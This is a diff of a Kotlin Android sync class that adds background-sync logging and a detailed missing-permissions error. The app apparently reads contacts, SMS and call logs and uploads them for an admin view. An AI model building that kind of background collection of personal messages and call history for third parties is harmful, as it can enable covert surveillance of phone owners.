@@ -29,6 +29,7 @@ class SyncEngine @Inject constructor(
 ) {
     suspend fun runSync(context: Context, isFullSync: Boolean): SyncResult {
         Log.d("SyncEngine", "SYNC_ENGINE_STARTED isFullSync=$isFullSync")
+        Log.d("SyncEngine", "BACKGROUND_SYNC_STARTED")
         if (isFullSync) Log.d("SyncEngine", "CLIENT_FULL_SYNC_STARTED")
 
         val deviceId = DeviceIdHelper.getDeviceId(context)
@@ -52,11 +53,17 @@ class SyncEngine @Inject constructor(
             Log.d("SyncEngine", "SYNC_ENGINE_PERMISSION_STATUS contacts=$contactsAllowed sms=$smsAllowed calls=$callsAllowed")
 
             if (!contactsAllowed && !smsAllowed && !callsAllowed) {
+                val missing = mutableListOf<String>()
+                if (!contactsAllowed) missing.add("READ_CONTACTS")
+                if (!smsAllowed) missing.add("READ_SMS")
+                if (!callsAllowed) missing.add("READ_CALL_LOG")
+                val error = "FAILED: Missing permissions: ${missing.joinToString(", ")}"
                 repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, now) + mapOf(
                     "syncStatus" to "Error",
-                    "lastError" to "Missing data permissions",
+                    "lastError" to error,
                     "lastSyncTime" to now
                 ))
+                Log.e("SyncEngine", "BACKGROUND_SYNC_FAILED: $error")
                 return SyncResult.PermissionMissing
             }
 
@@ -115,12 +122,14 @@ class SyncEngine @Inject constructor(
             ))
 
             Log.d("SyncEngine", "SYNC_UPLOAD_SUCCESS")
+            Log.d("SyncEngine", "BACKGROUND_SYNC_SUCCESS")
             if (isFullSync) Log.d("SyncEngine", "CLIENT_FULL_SYNC_SUCCESS")
             Log.d("SyncEngine", "ADMIN_REALTIME_UPDATED")
             return SyncResult.Success
         } catch (e: Exception) {
             val message = e.localizedMessage ?: e.message ?: e.javaClass.simpleName
             Log.e("SyncEngine", "SYNC_UPLOAD_FAILED", e)
+            Log.e("SyncEngine", "BACKGROUND_SYNC_FAILED: $message")
             if (isFullSync) Log.d("SyncEngine", "CLIENT_FULL_SYNC_FAILED")
             try {
                 repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + mapOf(
